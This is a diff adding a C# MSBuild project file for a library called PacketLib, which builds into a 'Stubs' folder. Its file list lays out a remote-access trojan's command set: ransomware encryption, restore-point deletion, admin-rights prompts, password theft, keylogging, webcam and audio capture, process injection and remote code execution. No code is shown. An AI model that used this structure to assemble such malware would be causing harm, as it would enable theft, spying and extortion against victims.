@@ -1,0 +1,109 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{81E3752A-0AC1-4EB4-8B5F-81EEA8FFB0FF}</ProjectGuid>
+    <OutputType>Library</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>PacketLib</RootNamespace>
+    <AssemblyName>PacketLib</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <DebugSymbols>false</DebugSymbols>
+    <DebugType>none</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>..\..\bin\Release\Stubs\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+    <DebugSymbols>false</DebugSymbols>
+    <AllowUnsafeBlocks>false</AllowUnsafeBlocks>
+    <GenerateSerializationAssemblies>Off</GenerateSerializationAssemblies>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="LoadingAPI.cs" />
+    <Compile Include="Interface\IPacket.cs" />
+    <Compile Include="Packet\Ransomware\RansomwareConfirmationPacket.cs" />
+    <Compile Include="Packet\UAC\AskAdminRightsPacket.cs" />
+    <Compile Include="Packet\Recovery\AutofillPacket.cs" />
+    <Compile Include="Packet\Client\BaseIpPacket.cs" />
+    <Compile Include="Packet\UAC\DeleteRestorePointPacket.cs" />
+    <Compile Include="Packet\Miscellaneous\OpenUrlPacket.cs" />
+    <Compile Include="Packet\PacketState.cs" />
+    <Compile Include="Packet\Ransomware\RansomwareDecryptionPacket.cs" />
+    <Compile Include="Packet\Recovery\RecoveryPacket.cs" />
+    <Compile Include="Packet\Miscellaneous\RemoteChatPacket.cs" />
+    <Compile Include="Packet\Ransomware\RansomwareEncryptionPacket.cs" />
+    <Compile Include="Packet\Miscellaneous\InformationPacket.cs" />
+    <Compile Include="Packet\Miscellaneous\KeylogOfflinePacket.cs" />
+    <Compile Include="Packet\Recovery\KeywordsPacket.cs" />
+    <Compile Include="Packet\Miscellaneous\RemoteCodeExecution.cs" />
+    <Compile Include="Packet\Desktop\RemoteKeyboardPacket.cs" />
+    <Compile Include="Packet\Desktop\RemoteMousePacket.cs" />
+    <Compile Include="Packet\Audio\RemoteAudioCapturePacket.cs" />
+    <Compile Include="Packet\Audio\RemoteAudioPacket.cs" />
+    <Compile Include="Packet\Webcam\RemoteCameraCapturePacket.cs" />
+    <Compile Include="Packet\File\RenameFilePacket.cs" />
+    <Compile Include="Packet\UAC\RestorePointPacket.cs" />
+    <Compile Include="Packet\Miscellaneous\ScreenRotationPacket.cs" />
+    <Compile Include="Packet\File\ShortCutFileManagersPacket.cs" />
+    <Compile Include="Packet\Client\UninstallPacket.cs" />
+    <Compile Include="Packet\File\UploadFilePacket.cs" />
+    <Compile Include="Packet\Miscellaneous\WallPaperPacket.cs" />
+    <Compile Include="Packet\Client\ClosePacket.cs" />
+    <Compile Include="Packet\Client\ConnectedPacket.cs" />
+    <Compile Include="Packet\File\DeleteFilePacket.cs" />
+    <Compile Include="Packet\File\DiskPacket.cs" />
+    <Compile Include="Packet\File\DownloadFilePacket.cs" />
+    <Compile Include="Packet\File\FileManagerPacket.cs" />
+    <Compile Include="Packet\Recovery\HistoryPacket.cs" />
+    <Compile Include="Packet\Miscellaneous\KeylogPacket.cs" />
+    <Compile Include="Packet\Miscellaneous\MemoryExecutionPacket.cs" />
+    <Compile Include="Packet\Miscellaneous\MiscellaneousPacket.cs" />
+    <Compile Include="Packet\PacketType.cs" />
+    <Compile Include="Packet\Recovery\PasswordsPacket.cs" />
+    <Compile Include="Packet\Miscellaneous\PowerPacket.cs" />
+    <Compile Include="Packet\Process\ProcessInjectionPacket.cs" />
+    <Compile Include="Packet\Process\ProcessKillerPacket.cs" />
+    <Compile Include="Packet\Process\ProcessManagerPacket.cs" />
+    <Compile Include="Packet\Webcam\RemoteCameraPacket.cs" />
+    <Compile Include="Packet\Desktop\RemoteViewerPacket.cs" />
+    <Compile Include="Packet\Process\ResumeProcessPacket.cs" />
+    <Compile Include="Packet\File\StartFilePacket.cs" />
+    <Compile Include="Packet\Process\SuspendProcessPacket.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Utils\Algorithm.cs" />
+    <Compile Include="Utils\Compressor.cs" />
+    <Compile Include="Utils\Encryption.cs" />
+    <Compile Include="Utils\Host.cs" />
+    <Compile Include="Utils\HwidGen.cs" />
+    <Compile Include="Utils\ImageProcessing.cs" />
+    <Compile Include="Utils\Miscellaneous.cs" />
+    <Compile Include="Utils\Native.cs" />
+    <Compile Include="Utils\Serializer.cs" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
